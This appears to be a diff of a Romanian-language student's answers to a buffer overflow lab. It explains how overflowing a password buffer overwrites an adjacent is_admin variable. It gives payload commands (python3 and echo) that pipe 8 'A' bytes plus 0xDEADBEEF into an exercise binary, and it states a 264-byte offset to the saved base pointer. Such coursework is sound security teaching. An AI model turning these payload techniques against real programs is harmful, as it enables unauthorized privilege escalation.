@@ -1,6 +1,8 @@
 Q1: Putem folosi buffer overflow pentru a accesa alte zone de memorie si putem modifica alte variabile
 Q2: Deoarece in stack variabilele is_admin si password sunt una langa alta pe stiva, doar daca facem buffer overflow cu un octet se schimba is_admin deci punem orice sir de caractere mai mare de 8 
 Q4:
-Am suprascris passwordul cu ciclic  AAAAAAAA si la is_admin am pus DEADBEEF
-python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*8 + struct.pack('<Q',0xDEADBE
-EF))" | ./ex2
+Pentru ex 2 variabila is_admin este long adica pe 8 octeti deci payloadul va fi 8 de A pentru parola si \xef\xbe\xad\xde\x00\x00\x00\x00 pentru is_admin
+ echo '\x41\x41\x41\x41\x41\x41\x41\x41\xef\xbe\xad\xde\x00\x00\x00\x00' | ./bin/ex2 
+
+ Q5: 
+ Offsetul are 256 cat este buffer ul si inca 8 pentru valoarea anterioara a base pointerului salvata anterior
